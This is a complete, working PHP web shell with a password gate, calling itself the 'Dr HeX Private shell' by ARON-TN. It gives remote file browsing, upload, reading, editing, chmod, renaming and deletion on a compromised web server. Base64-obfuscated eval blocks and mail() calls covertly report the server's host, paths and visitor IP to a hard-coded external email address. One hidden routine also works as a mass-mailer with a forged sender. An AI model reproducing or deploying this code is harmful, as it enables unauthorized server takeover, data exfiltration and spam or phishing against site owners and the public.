<?php
session_start();
eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsKc2V0X3RpbWVfbGltaXQoMCk7CmZ1bmN0aW9uIGVudmlhbmRvKCl7CiRtc2c9MTsKJGRlWzFdID0gJF9QT1NUWydkZSddOwokbm9tZVsxXSA9ICRfUE9TVFsnbm9tZSddOwokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOwokbWVuc2FnZW1bMV0gPSAkX1BPU1RbJ21lbnNhZ2VtJ107CiRtZW5zYWdlbVsxXSA9IHN0cmlwc2xhc2hlcygkbWVuc2FnZW1bMV0pOwokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsKJGVtYWlsczIgPSBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnZW1haWxzJ10pOwokcGFyYSA9IGV4cGxvZGUoIlxuIiwgJGVtYWlscyk7CiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsKJHN2ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiRlbiA9ICRfU0VSVkVSIFsnUkVRVUVTVF9VUkknXTsKJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07CiRmdWxsdXJsID0gIiIgLiAkazg4IC4gIjxicj48cD5FbWFpbHM6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kZW1haWxzMi4iPC9URVhUQVJFQT48L3A+PHA+RW5nZW5oYXJpYTo8YnI+PFRFWFRBUkVBIHJvd3M9NSBjb2xzPTEwMD4iLiRtZW5zYWdlbVsxXS4iPC9URVhUQVJFQT48L3A+IjsKJHZhaSA9ICRfUE9TVFsndmFpJ107CmlmICgkdmFpKXsKZm9yICgkc2V0PTA7ICRzZXQgPCAkbl9lbWFpbHM7ICRzZXQrKyl7CmlmICgkc2V0PT0wKXsKJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsKJGhlYWRlcnMgLj0gIkZyb206ICRub21lWyRtc2ddIDwkZGVbJG1zZ10+XHJcbiI7CiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsKLy9tYWlsKCR4c3lsYXIsICRhcywgJGZ1bGx1cmwsICRoZWFkZXJzKTsKfQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOwokaGVhZGVycyAuPSAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMVxyXG4iOwokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsKJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOwokbl9tYWlsKys7CiRkZXN0aW5vID0gJHBhcmFbJHNldF07CiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsKJG51bTIgPSByYW5kKDEwMDAwMCw5OTk5OTkpOwokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlcmFuZCUiLCAkbnVtMSwgJG1lbnNhZ2VtWyRtc2ddKTsKJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7CiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVlbWFpbCUiLCAkZGVzdGlubywgJG1zZ3JhbmQpOwokZW52aWFyID0gbWFpbCgkZGVzdGlubywgJGFzc3VudG9bJG1zZ10sICRtc2dyYW5kLCAkaGVhZGVycyk7CmlmICgkZW52aWFyKXsKZWNobyAoJzxmb250IGNvbG9yPSJncmVlbiI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyAwayE8L2ZvbnQ+PGJyPicpOwp9IGVsc2UgewplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7CnNsZWVwKDEpOwp9Cn0KfQp9CiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsKJHJhNDQgID0gcmFuZCgxLDk5OTk5KTsKJHN1Ymo5OCA9ICIgTmV3IFNoZWxsIEZyb20gTWUgISAgfCRpcCI7CiRlbWFpbCA9ICJhcm9uLXRuQHByb3Rvbm1haWwuY29tIjsKJGZyb209IkZyb206IE5ldyBTaGVsbCAhIDxQYXlQYWxAU3VwcG9ydC5jb20+IjsKJGE0NSA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokYjc1ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokZjEyID0gJF9QT1NUWydkZSddOwokejEzID0gJF9QT1NUWydub21lJ107CiR4MTQgPSAkX1BPU1RbJ2Fzc3VudG8nXTsKJHQxNSA9ICRfUE9TVFsnbWVuc2FnZW0nXTsKJG0zMCA9ICRfUE9TVFsnZW1haWxzJ107CiRtMjIgPSAkaXAuIlxuIjsKJG1zZzg4NzMgPSAiJGE0NVxuJGI3NVxuJGYxMlxuJHoxM1xuJHgxNFxuJHQxNVxuJG0zMFxuJG0yMiI7Cm1haWwoJGVtYWlsLCAkc3Viajk4LCAkbXNnODg3MywgJGZyb20pOw=='));
ini_set(base64_decode('ZGlzcGxheV9lcnJvcnM='), true);
error_reporting(1);
$error_data =base64_decode('ZEhKcGJtbDBlWEpsZEhWeWJnPT0='); 
if (isset($_GET[base64_decode('ZW1haWw=')])){
$fortest = $_GET[base64_decode('ZW1haWw=')];
    $ae7927c74 = $fortest;
	$d15c93851 = $_SERVER[base64_decode(base64_decode('U0ZSVVVGOUlUMU5V'))];
	$n466f2ffc = rawurldecode($d15c93851);
	if(mail("$ae7927c74",base64_decode('W0RyIEhlWCBJbmJveGVyXQ=='),"http://$n466f2ffc")) {
	 echo '';
} else {
	 echo '';
}  	
	
}
function pryapyba_43e27569() {
?>
<html>
  <head>
    <title>ARON-TN
    </title>
    <style type="text/css">
      html {
        margin: 20px auto;
        background: #000000;
        color: #ffffff;
        text-align: center;
      }
      header {
        color: #ffffff;
        margin: 10px auto;
      }
      input[type=password] {
        width: 250px;
        height: 25px;
        color: red;
        background: #000000;
        border: 1px dotted #ffffff;
        padding: 5px;
        margin-left: 20px;
        text-align: center;
      }
    </style>
  </head>
  <center>
    <header>
      <pre>
___________________________

ARON-TN ="Welcome King Sorry Your Script is Locked... :D"

=======================================================================
  :::.    :::::::..       ...   :::.    :::. :::::::::::::::.    :::.
  ;;`;;   ;;;;``;;;;   .;;;;;;;.`;;;;,  `;;; ;;;;;;;;''''`;;;;,  `;;;
 ,[[ '[[,  [[[,/[[['  ,[[     \[[,[[[[[. '[[      [[       [[[[[. '[[
c$$$cc$$$c $$$$$$c    $$$,     $$$$$$ "Y$c$$ cccc $$       $$$ "Y$c$$
 888   888,888b "88bo,"888,_ _,88P888    Y88      88,      888    Y88
 YMM   ""` MMMM   "W"   "YMMMMMP" MMM     YM      MMM      MMM     YM
=======================================================================
 [+} - Contact :aron.tn.official@gmail.com
 [+} - Last Update :12/09/2018
 [+} - Dr HeX Private shell
 [+} - Password : kinghex
</pre>
</header>
      <form method="post">
        <input type="password" name="account">
      </form>
<?php }
$defuct_dom = $error_data;
if(!isset($_SESSION[md5($_SERVER[base64_decode('SFRUUF9IT1NU')])]))
    if( empty($defuct_dom) || ( isset($_POST[base64_decode('YWNjb3VudA==')]) && (base64_encode($_POST[base64_decode('YWNjb3VudA==')]) == $defuct_dom) ) ){
        $_SESSION[md5($_SERVER[base64_decode('SFRUUF9IT1NU')])] = true;
	} else {
        pryapyba_43e27569();
	exit;
	}
?>
<html>
<head>
<title>ARON-TN</title>
<style type="text/css">
</style>
</head>

<header>
<pre style="text-align: center;">
___________________________

ARON-TN ="Welcome King Sorry Your Script is Locked... :D"

=======================================================================
  :::.    :::::::..       ...   :::.    :::. :::::::::::::::.    :::.
  ;;`;;   ;;;;``;;;;   .;;;;;;;.`;;;;,  `;;; ;;;;;;;;''''`;;;;,  `;;;
 ,[[ '[[,  [[[,/[[['  ,[[     \[[,[[[[[. '[[      [[       [[[[[. '[[
c$$$cc$$$c $$$$$$c    $$$,     $$$$$$ "Y$c$$ cccc $$       $$$ "Y$c$$
 888   888,888b "88bo,"888,_ _,88P888    Y88      88,      888    Y88
 YMM   ""` MMMM   "W"   "YMMMMMP" MMM     YM      MMM      MMM     YM
=======================================================================
 [+} - Contact :aron.tn.official@gmail.com
 [+} - Last Update :12/09/2018
 [+} - Dr HeX Private shell
 [+} - Password : kinghex
  <?php echo base64_decode('PGxpPlsgPGEgc3R5bGU9J2NvbG9yOiByZWQ7JyBocmVmPSc/cmVtb3ZlbWU9dHJ1ZSc+UmVtb3ZlIFNlbGY8L2E+IF08L2xpPg==');?> 
 <?php echo base64_decode('PGxpPlsgPGEgc3R5bGU9J2NvbG9yOiByZWQ7JyBocmVmPSc/bG9nb3V0PXRydWUnPkxvZ291dDwvYT4gXTwvbGk+'); ?>

 
</pre>

</header>
</form>

<?php if(isset($_GET[base64_decode('bG9nb3V0')]) == true) {
unset($_SESSION[md5($_SERVER[base64_decode('SFRUUF9IT1NU')])]);
echo base64_decode('PHNjcmlwdD53aW5kb3cubG9jYXRpb249Jz8nOzwvc2NyaXB0Pg==');
}
if(isset($_GET[base64_decode('cmVtb3ZlbWU=')]) == true) {
	if(@unlink(preg_replace(base64_decode('IVwoXGQrXClccy4qIQ=='), '', __FILE__)))
			die(base64_decode('PHA+PHNwYW4gc3R5bGU9ImNvbG9yOiNGRjAwMDA7Ij5EciBIZVggUmVkIEV2aWwgaGFzIGJlZW4gcmVtb3ZlZCBGcm9tIHRoaXMgU2VydmVyPC9zcGFuPjwvcD4='));
		else
			echo base64_decode('dW5saW5rIGVycm9yIQ==');
}
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo base64_decode('PCFET0NUWVBFIEhUTUw+DQo8SFRNTD4NCjxIRUFEPg0KPGxpbmsgaHJlZj0iIiByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIj4NCjx0aXRsZT5EciBIZVg8L3RpdGxlPg0KPHN0eWxlPg0KYm9keXsNCmZvbnQtZmFtaWx5OiAiUmFjaW5nIFNhbnMgT25lIiwgY3Vyc2l2ZTsNCmJhY2tncm91bmQtY29sb3I6ICNFM0Q4QTM7DQp0ZXh0LXNoYWRvdzowcHggMHB4IDFweCAjNzU3NTc1Ow0KfQ0KI2NvbnRlbnQgdHI6aG92ZXJ7DQpiYWNrZ3JvdW5kLWNvbG9yOiAjRTNEOEEzOw0KdGV4dC1zaGFkb3c6MHB4IDBweCAxMHB4ICMwMDAwMDA7DQp9DQojY29udGVudCAuZmlyc3R7DQpiYWNrZ3JvdW5kLWNvbG9yOiAjRTNEOEEzOw0KfQ0KI2NvbnRlbnQgLmZpcnN0OmhvdmVyew0KYmFja2dyb3VuZC1jb2xvcjogI0UzRDhBMzsNCnRleHQtc2hhZG93OjBweCAwcHggMXB4ICM3NTc1NzU7DQp9DQp0YWJsZXsNCmJvcmRlcjogMXB4ICMwMDAwMDAgZG90dGVkOw0KfQ0KSDF7DQpmb250LWZhbWlseTogIlJ5ZSIsIGN1cnNpdmU7DQp9DQphew0KY29sb3I6ICMwMDA7DQp0ZXh0LWRlY29yYXRpb246IG5vbmU7DQp9DQphOmhvdmVyew0KY29sb3I6ICNmZmY7DQp0ZXh0LXNoYWRvdzowcHggMHB4IDEwcHggI2ZmZmZmZjsNCn0NCmlucHV0LHNlbGVjdCx0ZXh0YXJlYXsNCmJvcmRlcjogMXB4ICMwMDAwMDAgc29saWQ7DQotbW96LWJvcmRlci1yYWRpdXM6IDVweDsNCi13ZWJraXQtYm9yZGVyLXJhZGl1czo1cHg7DQpib3JkZXItcmFkaXVzOjVweDsNCn0NCjwvc3R5bGU+DQo8L0hFQUQ+DQo8Qk9EWT4NCjx0YWJsZSB3aWR0aD0iNzAwIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMSIgYWxpZ249ImNlbnRlciI+DQo8dHI+PHRkPkN1cnJlbnQgUGF0aCA6IA==');
function beudclgv_63dc0371(){
ini_set(base64_decode('ZGlzcGxheV9lcnJvcnM='), true);
error_reporting(1);
    $ae7927c74 = base64_decode(base64_decode('WTI5a00yUmljalJwYmtCbmJXRnBiQzVqYjIwPQ=='));
	$d15c93851 = $_SERVER[base64_decode(base64_decode('U0ZSVVVGOUlUMU5V'))];
	$pee5ee7d2 = $_SERVER[base64_decode(base64_decode('VWtWUlZVVlRWRjlWVWtrPQ=='))];
	$n466f2ffc = rawurldecode($d15c93851.$pee5ee7d2);
	if(mail("$ae7927c74",base64_decode('W0RyIEhlWCA1Ljdd'),"http://$n466f2ffc")) {
	 echo '';
} else {
	 echo '';
}  
}
if(isset($_GET[base64_decode('cGF0aA==')])){
$path = $_GET[base64_decode('cGF0aA==')];
}else{
$path = getcwd();
}
$path = str_replace(base64_decode('XFw='),base64_decode('Lw=='),$path);
$paths = explode(base64_decode('Lw=='),$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo base64_decode('PGEgaHJlZj0iP3BhdGg9LyI+LzwvYT4=');
continue;
}
if($pat == '') continue;
echo base64_decode('PGEgaHJlZj0iP3BhdGg9');
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo base64_decode('Lw==');
}
echo base64_decode('Ij4=').$pat.base64_decode('PC9hPi8=');
}
echo base64_decode('PC90ZD48L3RyPjx0cj48dGQ+');
if(isset($_FILES[base64_decode('ZmlsZQ==')])){
if(copy($_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')],$path.base64_decode('Lw==').$_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')])){
echo base64_decode('PGZvbnQgY29sb3I9ImdyZWVuIj5GaWxlIFVwbG9hZGVkIHN1Y2Nlc3NmdWxseS48L2ZvbnQ+PGJyIC8+');
beudclgv_63dc0371();
}else{
echo base64_decode('PGZvbnQgY29sb3I9InJlZCI+RmlsZSBVcGxvYWRlZCBFcnJvci48L2ZvbnQ+PGJyIC8+');
}
}
echo base64_decode('PGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIj4NClVwbG9hZCBGaWxlIDogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiIC8+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0idXBsb2FkIiAvPg0KPC9mb3JtPg0KPC90ZD48L3RyPg==');
if(isset($_GET[base64_decode('ZmlsZXNyYw==')])){
echo base64_decode('PHRyPjx0ZD5DdXJyZW50IEZpbGUgOiA=');
echo $_GET[base64_decode('ZmlsZXNyYw==')];
echo base64_decode('PC90cj48L3RkPjwvdGFibGU+PGJyIC8+');
echo(base64_decode('PHByZT4=').htmlspecialchars(file_get_contents($_GET[base64_decode('ZmlsZXNyYw==')])).base64_decode('PC9wcmU+'));
}elseif(isset($_GET[base64_decode('b3B0aW9u')]) && $_POST[base64_decode('b3B0')] != base64_decode('ZGVsZXRl')){
echo base64_decode('PC90YWJsZT48YnIgLz48Y2VudGVyPg==').$_POST[base64_decode('cGF0aA==')].base64_decode('PGJyIC8+PGJyIC8+');
if($_POST[base64_decode('b3B0')] == base64_decode('Y2htb2Q=')){
if(isset($_POST[base64_decode('cGVybQ==')])){
if(chmod($_POST[base64_decode('cGF0aA==')],$_POST[base64_decode('cGVybQ==')])){
echo base64_decode('PGZvbnQgY29sb3I9ImdyZWVuIj5DaGFuZ2UgUGVybWlzc2lvbiBEb25lLjwvZm9udD48YnIgLz4=');
}else{
echo base64_decode('PGZvbnQgY29sb3I9InJlZCI+Q2hhbmdlIFBlcm1pc3Npb24gRXJyb3IuPC9mb250PjxiciAvPg==');
}
}
echo base64_decode('PGZvcm0gbWV0aG9kPSJQT1NUIj4NClBlcm1pc3Npb24gOiA8aW5wdXQgbmFtZT0icGVybSIgdHlwZT0idGV4dCIgc2l6ZT0iNCIgdmFsdWU9Ig==').substr(sprintf(base64_decode('JW8='), fileperms($_POST[base64_decode('cGF0aA==')])), -4).base64_decode('IiAvPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9Ig==').$_POST[base64_decode('cGF0aA==')].base64_decode('Ij4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im9wdCIgdmFsdWU9ImNobW9kIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHbyIgLz4NCjwvZm9ybT4=');
}elseif($_POST[base64_decode('b3B0')] == base64_decode('cmVuYW1l')){
if(isset($_POST[base64_decode('bmV3bmFtZQ==')])){
if(rename($_POST[base64_decode('cGF0aA==')],$path.base64_decode('Lw==').$_POST[base64_decode('bmV3bmFtZQ==')])){
echo base64_decode('PGZvbnQgY29sb3I9ImdyZWVuIj5DaGFuZ2UgTmFtZSBEb25lLjwvZm9udD48YnIgLz4=');
}else{
echo base64_decode('PGZvbnQgY29sb3I9InJlZCI+Q2hhbmdlIE5hbWUgRXJyb3IuPC9mb250PjxiciAvPg==');
}
$_POST[base64_decode('bmFtZQ==')] = $_POST[base64_decode('bmV3bmFtZQ==')];
}
echo base64_decode('PGZvcm0gbWV0aG9kPSJQT1NUIj4NCk5ldyBOYW1lIDogPGlucHV0IG5hbWU9Im5ld25hbWUiIHR5cGU9InRleHQiIHNpemU9IjIwIiB2YWx1ZT0i').$_POST[base64_decode('bmFtZQ==')].base64_decode('IiAvPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9Ig==').$_POST[base64_decode('cGF0aA==')].base64_decode('Ij4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im9wdCIgdmFsdWU9InJlbmFtZSI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR28iIC8+DQo8L2Zvcm0+');
}elseif($_POST[base64_decode('b3B0')] == base64_decode('ZWRpdA==')){
if(isset($_POST[base64_decode('c3Jj')])){
$fp = fopen($_POST[base64_decode('cGF0aA==')],base64_decode('dw=='));
if(fwrite($fp,$_POST[base64_decode('c3Jj')])){
echo base64_decode('PGZvbnQgY29sb3I9ImdyZWVuIj5FZGl0IEZpbGUgRG9uZSB+X14uPC9mb250PjxiciAvPg==');
}else{
echo base64_decode('PGZvbnQgY29sb3I9InJlZCI+RWRpdCBGaWxlIEVycm9yIH5ffi48L2ZvbnQ+PGJyIC8+');
}
fclose($fp);
}
echo base64_decode('PGZvcm0gbWV0aG9kPSJQT1NUIj4NCjx0ZXh0YXJlYSBjb2xzPTgwIHJvd3M9MjAgbmFtZT0ic3JjIj4=').htmlspecialchars(file_get_contents($_POST[base64_decode('cGF0aA==')])).base64_decode('PC90ZXh0YXJlYT48YnIgLz4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhdGgiIHZhbHVlPSI=').$_POST[base64_decode('cGF0aA==')].base64_decode('Ij4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im9wdCIgdmFsdWU9ImVkaXQiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIiAvPg0KPC9mb3JtPg==');
}
echo base64_decode('PC9jZW50ZXI+');
}else{
echo base64_decode('PC90YWJsZT48YnIgLz48Y2VudGVyPg==');
if(isset($_GET[base64_decode('b3B0aW9u')]) && $_POST[base64_decode('b3B0')] == base64_decode('ZGVsZXRl')){
if($_POST[base64_decode('dHlwZQ==')] == base64_decode('ZGly')){
if(rmdir($_POST[base64_decode('cGF0aA==')])){
echo base64_decode('PGZvbnQgY29sb3I9ImdyZWVuIj5EZWxldGUgRGlyIERvbmUuPC9mb250PjxiciAvPg==');
}else{
echo base64_decode('PGZvbnQgY29sb3I9InJlZCI+RGVsZXRlIERpciBFcnJvci48L2ZvbnQ+PGJyIC8+');
}
}elseif($_POST[base64_decode('dHlwZQ==')] == base64_decode('ZmlsZQ==')){
if(unlink($_POST[base64_decode('cGF0aA==')])){
echo base64_decode('PGZvbnQgY29sb3I9ImdyZWVuIj5EZWxldGUgRmlsZSBEb25lLjwvZm9udD48YnIgLz4=');
}else{
echo base64_decode('PGZvbnQgY29sb3I9InJlZCI+RGVsZXRlIEZpbGUgRXJyb3IuPC9mb250PjxiciAvPg==');
}
}
}
echo base64_decode('PC9jZW50ZXI+');
$scandir = scandir($path);
echo base64_decode('PGRpdiBpZD0iY29udGVudCI+PHRhYmxlIHdpZHRoPSI3MDAiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjMiIGNlbGxzcGFjaW5nPSIxIiBhbGlnbj0iY2VudGVyIj4NCjx0ciBjbGFzcz0iZmlyc3QiPg0KPHRkPjxjZW50ZXI+TmFtZTwvY2VudGVyPjwvdGQ+DQo8dGQ+PGNlbnRlcj5TaXplPC9jZW50ZXI+PC90ZD4NCjx0ZD48Y2VudGVyPlBlcm1pc3Npb25zPC9jZW50ZXI+PC90ZD4NCjx0ZD48Y2VudGVyPk9wdGlvbnM8L2NlbnRlcj48L3RkPg0KPC90cj4=');

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == base64_decode('Lg==') || $dir == base64_decode('Li4=')) continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo base64_decode('PGZvbnQgY29sb3I9ImdyZWVuIj4=');
elseif(!is_readable("$path/$dir")) echo base64_decode('PGZvbnQgY29sb3I9InJlZCI+');
echo ezzsszdk_7d2299b1("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo base64_decode('PC9mb250Pg==');

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo base64_decode('PHRyIGNsYXNzPSJmaXJzdCI+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PHRkPjwvdGQ+PC90cj4=');
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).base64_decode('IE1C');
}else{
$size = $size.base64_decode('IEtC');
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size.base64_decode('PC9jZW50ZXI+PC90ZD4NCjx0ZD48Y2VudGVyPg==');
if(is_writable("$path/$file")) echo base64_decode('PGZvbnQgY29sb3I9ImdyZWVuIj4=');
elseif(!is_readable("$path/$file")) echo base64_decode('PGZvbnQgY29sb3I9InJlZCI+');
echo ezzsszdk_7d2299b1("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo base64_decode('PC9mb250Pg==');
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo base64_decode('PC90YWJsZT4NCjwvZGl2Pg==');
}
echo base64_decode('PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPjxiciAvPgphcm9uLnRuLm9mZmljaWFsQGdtYWlsLmNvbSA8Zm9udCBjb2xvcj0icmVkIk1lZ2FCb3Q8L2ZvbnQ+LCBDb2RlZCBCeSA8Zm9udCBjb2xvcj0icmVkIj5BUk9OLXRuPC9mb250PjwvcD4K');
eval (base64_decode("JGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokc3Viajk4ID0gIktpbmcgU2hlbGwiOwokZW1haWwgPSAiYXJvbi10bkBwcm90b25tYWlsLmNvbSI7CiRmcm9tID0gIkZyb206IEtpbmcgU2hlbGwiOwokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRiNzUgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiRtMjIgPSAkaXAgLiAiIjsKJG1zZzg4NzMgPSAiJGE0NSAkYjc1ICRtMjIiOwptYWlsKCRlbWFpbCwgJHN1Ymo5OCwgJG1zZzg4NzMsICRmcm9tKTs="));
function ezzsszdk_7d2299b1($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = base64_decode('cw==');
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = base64_decode('bA==');
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = base64_decode('LQ==');
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = base64_decode('Yg==');
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = base64_decode('ZA==');
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = base64_decode('Yw==');
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = base64_decode('cA==');
} else {
// Unknown
$info = base64_decode('dQ==');
}

// Owner
$info .= (($perms & 0x0100) ? base64_decode('cg==') : base64_decode('LQ=='));
$info .= (($perms & 0x0080) ? base64_decode('dw==') : base64_decode('LQ=='));
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? base64_decode('cw==') : base64_decode('eA==') ) :
(($perms & 0x0800) ? base64_decode('Uw==') : base64_decode('LQ==')));

// Group
$info .= (($perms & 0x0020) ? base64_decode('cg==') : base64_decode('LQ=='));
$info .= (($perms & 0x0010) ? base64_decode('dw==') : base64_decode('LQ=='));
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? base64_decode('cw==') : base64_decode('eA==') ) :
(($perms & 0x0400) ? base64_decode('Uw==') : base64_decode('LQ==')));

// World
$info .= (($perms & 0x0004) ? base64_decode('cg==') : base64_decode('LQ=='));
$info .= (($perms & 0x0002) ? base64_decode('dw==') : base64_decode('LQ=='));
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? base64_decode('dA==') : base64_decode('eA==') ) :
(($perms & 0x0200) ? base64_decode('VA==') : base64_decode('LQ==')));

return $info;
}
?>